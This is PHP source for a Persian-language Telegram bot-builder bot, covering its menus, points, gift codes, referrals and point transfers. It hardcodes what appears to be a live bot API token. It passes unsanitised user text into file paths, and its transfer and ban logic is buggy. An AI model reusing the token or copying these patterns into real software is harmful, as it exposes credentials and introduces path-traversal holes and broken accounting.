<?php

ob_start();
$load = sys_getloadavg();
$telegram_ip_ranges = [
['lower' => '149.154.160.0', 'upper' => '149.154.175.255'], 
['lower' => '91.108.4.0',    'upper' => '91.108.7.255'],    
];
$ip_dec = (float) sprintf("%u", ip2long($_SERVER['REMOTE_ADDR']));
$ok=false;
foreach ($telegram_ip_ranges as $telegram_ip_range) if (!$ok) {
$lower_dec = (float) sprintf("%u", ip2long($telegram_ip_range['lower']));
$upper_dec = (float) sprintf("%u", ip2long($telegram_ip_range['upper']));
if($ip_dec >= $lower_dec and $ip_dec <= $upper_dec) $ok=true;
}
if(!$ok) die("No Spam");
define('API_KEY','1124987439:AAHZD1dNGI97pIzZRCswqQOGPofZw9tvJ4I'); //توکن
function bot($method,$datas=[]){
$url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
 $res = curl_exec($ch);
 if(curl_error($ch)){
var_dump(curl_error($ch));
}else{
return json_decode($res);
}
}
//=========
$token = API_KEY;
$Dev = 602515350; //ایدی عددی ادمین
$name_bot = "زیما کریت";
$channel = "ShahreSource";// ایدی کانال رباتساز بدون @
$bot_id = "zimacreatbot"; // ایدی رباتساز بدون @
$support = "mahdipoker"; // ایدی فرد پشتیبانی بدون @
$folder = "https://bot.devmahdi.ir/zimacreat/"; // ادرس هاست و پوشه
//-------------------------------فانکشن ها---------------------------------------------
function SendMessage($chat_id, $text){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>$text,
'parse_mode'=>'MarkDown']);
}
function save($filename, $data){
$file = fopen($filename, 'w');
fwrite($file, $data);
fclose($file);
}
function SendDocument($chat_id, $document, $caption = null){
bot('SendDocument',[
'chat_id'=>$chat_id,
'document'=>$document,
'caption'=>$caption
]);
}
function EditMessageText($xchatid,$xmessageid,$text,$parse_mode,$disable_web_page_preview,$keyboard){
bot('editMessagetext',[
'chat_id'=>$xchatid,
'message_id'=>$xmessageid,
'text'=>$text,
'parse_mode'=>$parse_mode,
'disable_web_page_preview'=>$disable_web_page_preview,
'reply_markup'=>$keyboard
]);
 }
function SendPhoto($chat_id, $photo, $caption = null){
bot('SendPhoto',[
'chat_id'=>$chat_id,
'photo'=>$photo,
'caption'=>$caption
]);
}
function sendAction($chat_id, $action){
bot('sendChataction',[
'chat_id'=>$chat_id,
'action'=>$action]);
}
function deleteFolder($path){
if(is_dir($path) === true){
$files = array_diff(scandir($path), array('.', '..'));
foreach ($files as $file)
deleteFolder(realpath($path) . '/' . $file);
return rmdir($path);
}else if (is_file($path) === true)
return unlink($path);
return false;
}
function Forward($kojashe, $azkoja, $kodommsg){
bot('forwardmessage',[
'chat_id'=>$kojashe,
'from_chat_id'=>$azkoja,
'message_id'=>$kodommsg
]);
}
function LeaveChat($chat_id){
bot('LeaveChat',[
'chat_id'=>$chat_id
]);
}
function GetChat($chat_id){
bot('GetChat',[
'chat_id'=>$chat_id
]);
}

//==
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$chat_id = $message->chat->id;
$from_id = $message->from->id;
mkdir("data/$from_id");
$text1 = $update->message->text;
$text = $update->message->text;
$first_name = $update->message->from->first_name;
$last_name = $update->message->from->last_name;
$username = $update->message->from->username;
$message_id = $update->message->message_id;
$reply = $update->message->reply_to_message;
$coin = file_get_contents("data/$from_id/coin.txt");
$bot = file_get_contents("data/$from_id/step.txt");
$file=file_get_contents("data/$from_id/file.txt");
@$adminbotsaz = file_get_contents("data/$from_id/adminclicker.txt");
@$command = file_get_contents("data/$chat_id/com.txt");
@$amir = file_get_contents("data/$chat_id/amir.txt");
$remove = json_encode(['KeyboardRemove'=>[],'remove_keyboard'=>true]);
@$onof = file_get_contents("data/onof.txt");
$mode = file_get_contents("data/$from_id/mode.txt");
$state = file_get_contents("data/$from_id/state.txt");
$step = file_get_contents("data/$from_id/step.txt");
$allcoin = file_get_contents("data/$from_id/allcoin.txt");
$Members = file_get_contents("data/Member.txt");
$type = file_get_contents("data/$from_id/type.txt");
$list = file_get_contents("users.txt");
@$sea = file_get_contents("data/$from_id/membrs.txt");
$wait = file_get_contents("data/$from_id/wait.txt");
$listttt = file_get_contents("Member.txt");
$members = file_get_contents('Member.txt');
$memlist = explode("\n", $members);
$member = file_get_contents("data/$from_id/member.txt");
$blocklist = file_get_contents("data/blocklist.txt");
$forward_chat_username = $update->message->forward_from_chat->username;
$created = file_get_contents("data/$from_id/create.txt");
$Bots = file_get_contents("data/bots.txt");
$user_bots = file_get_contents("data/$from_id/bots.txt");
$my_id = file_get_contents("bot00/$text/data/my_id.txt");
$user = json_decode(file_get_contents('data/'.$from_id.'/data.json'));
$to = file_get_contents("data/$from_id/to.txt");
$timenow = time();
$lasttime = file_get_contents("data/$from_id/time.txt");
$da = $update->message->reply_to_message->forward_from->id;
$forchaneel = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=@$channel&user_id=".$from_id));
$tch = $forchaneel->result->status;
function rand_string( $length ) {
$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
return substr(str_shuffle($chars),0,$length);
}
$hadi =  rand_string(10);
$randbotsa =  rand_string(12);
//---------------------------شروع ---------------------------//
if(in_array($from_id, $list['ban'])){
SendMessage($chat_id,"
 ❌شما از ربات مسدود شدید❌
",null);
exit();
}else{
function Spam($from_id){
@mkdir("data/spam");
$spam_status = json_decode(file_get_contents("data/spam/$from_id.json"),true);
if($spam_status != null){
if(mb_strpos($spam_status[0],"time") !== false){
if(str_replace("time ","null",$spam_status[0]) >= time())
exit(false);
else
$spam_status = [1,time()+2];
}
elseif(time() < $spam_status[1]){
if($spam_status[0]+1 > 4){
$time = time() + 500;
$spam_status = ["time $time"];
file_put_contents("data/spam/$from_id.json",json_encode($spam_status,true));
bot('SendMessage',[
'chat_id'=>$from_id,
'text'=>"📛 به دلیل اسپم به مدت 500 ثانیه مسدود شدید !",
]);
exit(false);
}else{
$spam_status = [$spam_status[0]+1,$spam_status[1]];
}
}else{
$spam_status = [1,time()+2];
}
}else{
$spam_status = [1,time()+2];
}
file_put_contents("data/spam/$from_id.json",json_encode($spam_status,true));
}
}
Spam($from_id);
//=====
if($text1=="/start" and $chat_id != $Dev){
$user = file_get_contents('users.txt');
$members = explode("\n", $user);
if(!in_array($from_id, $members)){
$add_user = file_get_contents('users.txt');
$add_user .= $from_id . "\n";
file_put_contents("data/$chat_id/membrs.txt", "0");
file_put_contents("data/$chat_id/coin.txt", "5");
file_put_contents("data/$chat_id/type.txt", "Free");
file_put_contents('users.txt', $add_user);
}
file_put_contents("data/$chat_id/hadi.txt", "no");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
✋سلام✋

🌹به رباتساز $name_bot خوش آمدید🌹

🤖با این رباتساز میتوانید انواع ربات پرسرعت و بدون آفی بسازید🤖

👇از منوی زیر استفاده کنید👇
",
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'🤖ساخت ربات🤖'],['text'=>'🗂حساب کاربری🗂']],
[['text'=>'🏛نمایندگی'],['text'=>'🚫حذف ربات'],['text'=>'🎁کد هدیه']],
[['text'=>'📚قوانین'],['text'=>'🛍فروشگاه']],
[['text'=>'📮پشتیبانی'],['text'=>'📨وضعیت رباتساز']],
],
'resize_keyboard'=>true,
])
]);
bot('sendMessage',[   
'chat_id'=>$Dev,    
'text'=>"
👇یک نفر با آیدی زیر ربات را استارت کرد👇

[$from_id](tg://user?id=$from_id)
",   
'parse_mode'=>'MarkDown'   
]);
}
if($text1=="/start"  and $chat_id == $Dev){
$user = file_get_contents('users.txt');
$members = explode("\n", $user);
if(!in_array($from_id, $members)){
$add_user = file_get_contents('users.txt');
$add_user .= $from_id . "\n";
file_put_contents("data/$chat_id/membrs.txt", "0");
file_put_contents("data/$chat_id/coin.txt", "5");
file_put_contents("data/$chat_id/type.txt", "Free");
file_put_contents('users.txt', $add_user);
}
file_put_contents("data/$chat_id/hadi.txt", "no");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
✋سلام✋

🌹به رباتساز $name_bot خوش آمدید🌹

🤖با این رباتساز میتوانید انواع ربات پرسرعت و بدون آفی بسازید🤖

👇از منوی زیر استفاده کنید👇
",
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'🤖ساخت ربات🤖'],['text'=>'🗂حساب کاربری🗂']],
[['text'=>'🏛نمایندگی'],['text'=>'🚫حذف ربات'],['text'=>'🎁کد هدیه']],
[['text'=>'📚قوانین'],['text'=>'🛍فروشگاه']],
[['text'=>'📮پشتیبانی'],['text'=>'📨وضعیت رباتساز']],
[['text'=>"👤پنل مدیریت👤"]],
],
'resize_keyboard'=>true,
])
]);
}
elseif (strpos($text, '/start') !== false) {
$newid = str_replace("/start ", "", $text);
if($from_id == $newid) {
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "
",
]);
} 
elseif (strpos($list, "$from_id") !== false){
SendMessage($chat_id,"
");
}else{
@$sho = file_get_contents("data/$newid/coin.txt");
$getsho = $sho + 1;
file_put_contents("data/$newid/coin.txt", $getsho);
@$sea = file_get_contents("data/$newid/membrs.txt");
$getsea = $sea + 1;
file_put_contents("data/$newid/membrs.txt", $getsea);
$user = file_get_contents('users.txt');
$members = explode("\n", $user);
if(!in_array($from_id, $members)){
$add_user = file_get_contents('users.txt');
$add_user .= $from_id . "\n";
@$sea = file_get_contents("data/$from_id/membrs.txt");
file_put_contents("data/$chat_id/membrs.txt", "0");
file_put_contents("data/$chat_id/coin.txt", "5");
file_put_contents("data/$chat_id/type.txt", "Free");
file_put_contents('users.txt', $add_user);
}
file_put_contents("data/$chat_id/hadi.txt", "No");
sendmessage($chat_id, "
","Markdown","true");
bot('sendmessage', [
'chat_id' => $chat_id,
'text' => "
✋سلام✋

🌹به رباتساز $name_bot خوش آمدید🌹

🤖با این رباتساز میتوانید انواع ربات پرسرعت و بدون آفی بسازید🤖

👇از منوی زیر استفاده کنید👇
",
'parse_mode' => "HTML",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'🤖ساخت ربات🤖'],['text'=>'🗂حساب کاربری🗂']],
[['text'=>'🏛نمایندگی'],['text'=>'🚫حذف ربات'],['text'=>'🎁کد هدیه']],
[['text'=>'📚قوانین'],['text'=>'🛍فروشگاه']],
[['text'=>'📮پشتیبانی'],['text'=>'📨وضعیت رباتساز']],
],
'resize_keyboard'=>true,
])
]);
bot('sendMessage',[   
'chat_id'=>$Dev,    
'text'=>"
👇یک نفر با آیدی زیر زیر ربات را استارت کرد👇

[$from_id](tg://user?id=$from_id)
",   
'parse_mode'=>'MarkDown'   
]);
SendMessage($newid, "✅[$first_name](tg://user?id=$from_id) با لینک زیرمجموعه گیری شما رباتساز را استارت کرد✅","Markdown","true");
}
}

elseif(strpos($blocklist, "$from_id") !== false  ) {
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"❌شما در ربات به دلیل نقض قوانین مسدود شدید❌
",
'reply_markup'=>json_encode([
'remove_keyboard'=>true,
])
]);
exit();
}
//========//
if($onof == "off" && $from_id != $Dev){
SendMessage($chat_id,"⚠درحال حاضر ربات توسط ادمین خاموش شده است لطفا در زمان دیگری تلاش کنید.⚠", null, $message_id, $remove);   
 return false;
exit();
}
//==================//
elseif($tch != 'member' && $tch != 'creator' && $tch != 'administrator'){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
👇دوست عزیز جهت استفاده از رباتساز ابتدا در کانال رسمی رباتساز عضو شوید👇

👉 @$channel | @$channel 👈
👉 @$channel | @$channel 👈

🔄بعد از عضویت مجددا دستور 《/start》را ارسال کنید🔄
",
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"📣کانال $name_bot📣",'url'=>"https://t.me/$channel"]],
]
])
]);
exit();
}
//==================//
elseif($text1 == "↩️برگشت" and $chat_id != $Dev){
file_put_contents("data/$from_id/step.txt","none");
file_put_contents("data/$from_id/state.txt","none");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"✅به منوی اصلی برگشتیم✅️",
'parse_mode'=>"MarkDown",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'🤖ساخت ربات🤖'],['text'=>'🗂حساب کاربری🗂']],
[['text'=>'🏛نمایندگی'],['text'=>'🚫حذف ربات'],['text'=>'🎁کد هدیه']],
[['text'=>'📚قوانین'],['text'=>'🛍فروشگاه']],
[['text'=>'📮پشتیبانی'],['text'=>'📨وضعیت رباتساز']],
],
'resize_keyboard'=>true,
])
]);
exit();
}
elseif($text1 == "↩️برگشت" and $chat_id == $Dev){
file_put_contents("data/$from_id/step.txt","none");
file_put_contents("data/$from_id/state.txt","none");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"✅به منوی اصلی برگشتیم✅️",
'parse_mode'=>"MarkDown",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'🤖ساخت ربات🤖'],['text'=>'🗂حساب کاربری🗂']],
[['text'=>'🏛نمایندگی'],['text'=>'🚫حذف ربات'],['text'=>'🎁کد هدیه']],
[['text'=>'📚قوانین'],['text'=>'🛍فروشگاه']],
[['text'=>'📮پشتیبانی'],['text'=>'📨وضعیت رباتساز']],
[['text'=>"👤پنل مدیریت👤"]],
],
'resize_keyboard'=>true,
])
]);
exit();
}

elseif($text1 == "🤣جوک"){
	$jok = file_get_contents("https://api.codebazan.ir/jok/");
file_put_contents("data/$from_id/step.txt","bsbhs");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"$jok",
'parse_mode'=>"MarkDown",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔻بخش خدمات مجازی🔺"]],
[['text'=>"بخش جذب ممبر💠"],['text'=>"💠 بخش کاربردی"]],
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true,
])
]);
}
//==================//
elseif($text1 == "🤖ساخت ربات🤖"){
file_put_contents("data/$from_id/step.txt","bsbhs");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"👇یک بخش را انتخاب کنید👇",
'parse_mode'=>"MarkDown",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔻بخش خدمات مجازی🔺"]],
[['text'=>"بخش جذب ممبر💠"],['text'=>"💠 بخش کاربردی"]],
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true,
])
]);
}
elseif($text1 == "🔻بخش خدمات مجازی🔺"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
این قسمت درحال ساخت میباشد!
",
'parse_mode'=>"MarkDown",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true,
])
]);
}
elseif($text1 == "/start back"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
✋سلام✋

🌹به رباتساز زیما کریت خوش آمدید🌹

🤖با این رباتساز میتوانید انواع ربات پرسرعت و بدون آفی بسازید🤖

👇از منوی زیر استفاده کنید👇",
'parse_mode'=>"MarkDown",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'🤖ساخت ربات🤖'],['text'=>'🗂حساب کاربری🗂']],
[['text'=>'🏛نمایندگی'],['text'=>'🚫حذف ربات'],['text'=>'🎁کد هدیه']],
[['text'=>'📚قوانین'],['text'=>'🛍فروشگاه']],
[['text'=>'📮پشتیبانی'],['text'=>'📨وضعیت رباتساز']],
],
'resize_keyboard'=>true,
])
]);
}
//==================//
elseif($text1 == "🆓بخش رایگان🆓" and $step == "bsbhs"){
file_put_contents("data/$from_id/mode.txt","normal");
file_put_contents("data/$from_id/step.txt","none");
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>"🌹به بخش رایگان خوش آمدید🌹",
'parse_mode'=>"MarkDown", 
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"👤جذب ممبر👤"],['text'=>"⚙کاربردی⚙"]],
[['text'=>"↩️برگشت"]],
],'resize_keyboard'=>true,
])
]);
}
elseif($text1 == "💎بخش ویژه💎" and $step == "bsbhs"){
if($type == "Vip"){
file_put_contents("data/$from_id/mode.txt","vip");
file_put_contents("data/$from_id/step.txt","none");
bot('sendmessage', ['chat_id' => $chat_id, 'text' =>"🌹به بخش ویژه خوش آمدید🌹",]);
bot('sendMessage',['chat_id'=>$chat_id, 'text'=>"👇یک بخش را انتخاب کنید👇", 'parse_mode'=>"MarkDown", 'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>"🎙ویس سیتی🎙"]],
[['text'=>"📞شماره یاب📞"],['text'=>"🛒فروشگاه🛒"]],
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true,
])
]);
}else{
file_put_contents("data/$from_id/step.txt","none");
bot('sendMessage',['chat_id'=>$chat_id,'text'=>"❌حساب شما در رباتساز ویژه نیست❌",'parse_mode'=>"HTML",]);
}
}

//============================//
//============================//
//============================//
elseif($text1 == "بخش جذب ممبر💠"){
file_put_contents("data/$from_id/step.txt","none");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"این بخش درحال ساخت میباشد لطفا بعدا مجدد تلاش کنید!",
'parse_mode'=>"MarkDown",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true,
])
]);
}
//============================//
elseif($text1 == "💠 بخش کاربردی"){
file_put_contents("data/$from_id/step.txt","none");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"👇یک بخش را انتخاب کنید👇",
'parse_mode'=>"MarkDown",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"📇یوزر اینفو📇"],['text'=>"🗣پیام رسان🗣️"]],
[['text'=>"🛡ضد لینک🛡"],['text'=>"👥ممبرگیر👥"]],
[['text'=>"🖥هاست دهی🖥"],['text'=>"🗃اطلاعات دامنه🗃"]],
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true,
])
]);
}
elseif($text1 == "🖥هاست دهی🖥" or $text1 == "👥ممبرگیر👥" or $text1 == "🗃اطلاعات دامنه🗃"){
file_put_contents("data/$from_id/step.txt","none");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"ربات هنوز تکمیل نشده است",
'parse_mode'=>"MarkDown",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"📇یوزر اینفو📇"],['text'=>"🗣پیام رسان🗣️"]],
[['text'=>"🛡ضد لینک🛡"],['text'=>"👥ممبرگیر👥"]],
[['text'=>"🖥هاست دهی🖥"],['text'=>"🗃اطلاعات دامنه🗃"]],
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true,
])
]);
}
elseif($text1 == "/start up"){
bot('sendMessage',
['chat_id'=>$chat_id,
'text'=>"👌ربات با موفقیت اپدیت شد!
برای به روز رسانی از طریق دکمه زیر اقدام کنید",
'parse_mode'=>"HTML",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"😋 بزن بریم",'url'=>"https://t.me/zimacreatbot?start=back"]],
]])
]);
}

//============================//
if($xdata == "kharidemtiaz"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"👇جهت خرید امتیاز بر روی لینک مورد نظر خود کلیک کنید👇",
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🛒 10 امتیاز | 1000 تومان 🛒",'url'=>"https://t.me/$support"]],
[['text'=>"🛒 20 امتیاز | 2000 تومان 🛒",'url'=>"https://t.me/$support"]],
[['text'=>"🛒 50 امتیاز | 5000 تومان 🛒",'url'=>"https://t.me/$support"]],
[['text'=>"🛒 100 امتیاز | 10000 تومان 🛒",'url'=>"https://t.me/$support"]],
]])
]);
}
elseif($text1 == "🛍فروشگاه"){
bot('sendMessage',
['chat_id'=>$chat_id,
'text'=>"👇جهت خرید امتیاز بر روی لینک مورد نظر خود کلیک کنید👇",
'parse_mode'=>"HTML",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"🛒 10 امتیاز | 1000 تومان 🛒",'url'=>"https://t.me/$support"]],
[['text'=>"🛒 20 امتیاز | 2000 تومان 🛒",'url'=>"https://t.me/$support"]],
[['text'=>"🛒 50 امتیاز | 5000 تومان 🛒",'url'=>"https://t.me/$support"]],
[['text'=>"🛒 100 امتیاز | 10000 تومان 🛒",'url'=>"https://t.me/$support"]],
]])
]);
}

//============================//
elseif($text1 == "☀امتیاز روزانه☀"){
     if($timenow < $lasttime){
SendMessage($chat_id,"❌شما امتیاز مربوط به امروزتان را دریافت کرده اید❌");
}
else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🔹لطفا پکیج مورد نظر خود را برای دریافت امتیاز روزانه انتخاب کن تا بهت امتیاز بدم 🤷‍♂️",
'parse_mode'=>"MarkDown",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"1️⃣"],['text'=>"2️⃣"],['text'=>"3️⃣"]],
[['text'=>"4️⃣"],['text'=>"5️⃣"],['text'=>"6️⃣"]],

[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true,
])
]);
}}
elseif($text == "1️⃣" or $text == "2️⃣" or $text == "3️⃣" or $text == "4️⃣" or $text == "5️⃣" or $text == "6️⃣"){
    if($timenow < $lasttime){
SendMessage($chat_id,"❌شما امتیاز مربوط به امروزتان را دریافت کرده اید❌");
}else{
$maghzbad = rand(1,10);
file_put_contents("data/$from_id/coin.txt", $coin + $maghzbad);
file_put_contents("data/$from_id/time.txt", $timenow + 86400);
SendMessage($chat_id,"🎉️تبریک $maghzbad امتیاز به شما تعلق گرفت🎉");
}}
//============================//
//============================//

//============================//
elseif($text1 == "🗂حساب کاربری🗂"){
file_put_contents("data/$from_id/step.txt","none");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"👇یک بخش را انتخاب کنید👇",
'parse_mode'=>"MarkDown",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"💎ویژه شدن💎"],['text'=>"🗄ربات های من🗄"]],
[['text'=>"🤖آموزش بات فادر🤖"],['text'=>"📤انتقال امتیاز📤️"]],
[['text'=>"📋اطلاعات من📋"],['text'=>"☀امتیاز روزانه☀"]],
[['text'=>"👥زیرمجموعه گیری👥"]],
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true,
])
]);
}
elseif($text1 == "🤖آموزش بات فادر🤖"){
file_put_contents("data/$from_id/step.txt","none");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"👇یک بخش را انتخاب کنید👇",
'parse_mode'=>"MarkDown",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🤖آموزش ساخت ربات🤖"]],
[['text'=>"🤖راهنمای دستورات بات فادر🤖️"]],
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true,
])
]);
}
//====================//
//====================//
elseif($text1 == "📚قوانین"){
file_put_contents("data/$from_id/step.txt","none");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
👇قوانین رباتساز $name_bot👇

1⃣ تمامی ربات های شما باید تابع قوانین جمهوری اسلامی ایران باشند.

2⃣ مسئولیت پیام های رد و بدل شده در هر ربات با شما می باشد و ما هیچگونه مسئولیتی نداریم.

3⃣ در صورت مشاهده استفاده از ربات هایتان در موارد منفی ربات های شما مسدود شده و برای شما محدودیتی موقت برای استفاده از رباتساز در نظر میگیریم.

4⃣ در صورت عدم استفاده از ربات هایتان به مدت طولانی ربات شما از سرور های ما حذف شده و 50% امتیاز استفاده شده برای ساخت آن ربات به حسابتان واریز می شود.

5⃣ اگر به هر دلیلی ربات های شما به سرور ما فشار بیاورند سه بار به شما اخطار می دهیم و در صورت نادیده گرفتن آخرین اخطار ربات های شما مسدود شده و هرگز از محدودیت خارج نمی شود.

🆑 @$channel
🤖 @$bot_id
",
'parse_mode'=>"HTML",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true,
])
]);
}
//====================//
elseif($text1 == "🏛نمایندگی"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
🤖فروش نمایندگی رباتساز $name_bot🤖

🤑شما هم می توانید رباتسازی مثل رباتساز ما را داشته باشید و با آن کسب درآمد کنید🤑

💰هزینه نصب و فعالسازی رباتساز ده هزار تومان می باشد و پنج هزار تومان هزینه شارژ ماهانه است💰

👇جهت کسب اطلاعات بیشتر و خرید به آیدی یا ربات زیر مراجعه کنید👇

👤 @$support
🤖 @$bot_id
",
'parse_mode'=>"MarkDown",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true,
])
]);
}
//====================//
elseif($text1 == "🎁کد هدیه"){
 file_put_contents('data/'.$from_id."/step.txt","useCode");
 var_dump(bot('sendMessage',[
     'chat_id'=>$update->message->chat->id,
     'text'=>"🎁کد هدیه را ارسال کنید :",
     'parse_mode'=>'MarkDown',
     'reply_markup'=>json_encode([
         'keyboard'=>[
             [
                 ['text'=>"↩️برگشت"]
             ]
         ],
         'resize_keyboard'=>true
     ])
 ]));
}

elseif($bot == "useCode" and $text != "↩️برگشت"){
file_put_contents('data/'.$from_id."/step.txt","none");
 if (file_exists("admin/code/$text.txt")) {
  $price = file_get_contents("admin/code/$text.txt");
  if($price == 'true'){
        bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' => "❌کدی که فرستادید یا منقضی شده و یا اصلا وجود ندارد❌",
            'parse_mode' => "MarkDown",
        ]);
  }else{
$coin = file_get_contents('data/'.$from_id."/coin.txt");
$coinsprice = file_get_contents("admin/coins/$text.txt");
$getcoins = $coin + $coinsprice;
file_put_contents("data/$chat_id/coin.txt",$getcoins);
file_put_contents("admin/code/$text.txt","true");
if(in_array($chat_id,$Dev)){
  var_dump(bot('sendMessage',[
      'chat_id'=>$update->message->chat->id,
      'text'=>"🎉تبریک مقدار $coinsprice امتیاز به شما اضافه شد🎉",
      'parse_mode'=>'MarkDown',
      'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true
     ])
 ]));
}else{
  var_dump(bot('sendMessage',[
      'chat_id'=>$chat_id,
      'text'=>"🎉تبریک مقدار $coinsprice امتیاز به شما اضافه شد🎉",
      'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true
     ])
 ]));
}
	bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"
✅کد با موفقیت استفاده شد✅

👇اطلاعات فرد استفاده کننده👇

👤 اسم : $first_name
🆔 آیدی : @$username
🔢 آیدی عددی : $from_id
💰 تعداد امتیاز : $coinsprice

😉منتظر کد های بعدی باشید😉

🆑 @$channel
🤖 @$bot_id
",
	]);
  }
 }else{
	 file_put_contents('data/'.$from_id."/com.txt","none");
	bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"❌کدی که فرستادید یا منقضی شده و یا اصلا وجود ندارد❌",
	]);
 }
}
//====================//
if($text =="📤انتقال امتیاز📤️" && $text !="↩️برگشت"){
file_put_contents("data/$from_id/state.txt","kodom");
SendMessage($chat_id,"🔢آیدی عددی فرد را ارسال کنید🔢","html","true");
}
if($state == "kodom" && $text !="↩️برگشت"){
if(file_exists("data/$text/state.txt")){
file_put_contents("data/$from_id/kodom.txt","$text");
file_put_contents("data/$from_id/state.txt","ine");
SendMessage($chat_id,"🔢مقدار امتیازی که می خواهید برای فرد مورد نظر انتقال بیابد را وارد کنید🔢","html","true");
}else{
file_put_contents("data/$from_id/state.txt","none");
file_put_contents("data/$from_id/kodom.txt","none");
SendMessage($chat_id,"❌کاربر مورد نظر در ربات عضو نیست❌","html","true");
}
}
if($state == "ine" && $text !="↩️برگشت"){
if($coin > $text){
$kodom = file_get_contents("data/$from_id/kodom.txt");
$kamas = $coin +$text;
file_put_contents("data/$kodom/coin.txt","$kamas");
$kame = $coin -$text;
file_put_contents("data/$from_id/cointxt","$kame");
file_put_contents("data/$from_id/state.txt","none");
file_put_contents("data/$from_id/kodom.txt","none");
SendMessage($chat_id,"✅به تعداد $text امتیاز با موفقیت به کاربر مورد نظر انتقال یافت✅","html","true");
SendMessage($kodom,"🎊تبریک کاربر @$username به تعداد $text امتیاز به شما هدیه کرد🎊","html","true");
}else{
file_put_contents("data/$from_id/state.txt","none");
file_put_contents("data/$from_id/kodom.txt","none");
SendMessage($chat_id,"❌متاسفانه امتیاز شما برای انتقال کافی نمی باشد❌","html","true");
}
$newcoin = $coin - $text;
file_put_contents("data/$from_id/coin.txt",$newcoin);

}

if($text == '1'){
bot('sendmessage', [
'chat_id' => $chat_id,
'text' => "
کد شما:
$hadi",
]);
}
//====================//
elseif($text == "📨وضعیت رباتساز"){
$load = sys_getloadavg();
$mem = memory_get_usage();
$ver = phpversion();           
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
🎚پینگ ربات🎚
$load[0]
🤖ورژن ربات🤖
1.0
📟ورژن پی اچ پی📟
$ver
💾میزان مصرف حافظه💾
$mem KB
",
'parse_mode'=>'HTML',
]);
 }
//====================//
elseif($text1 == "👥زیرمجموعه گیری👥"){
file_put_contents("data/$from_id/step.txt","none");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
👇لطفا نوع بنر را مشخص کنید👇
",
'parse_mode'=>"MarkDown",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"⚫شیشه ای⚫"],['text'=>"⚪ساده⚪️"]],
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true,
])
]);
}
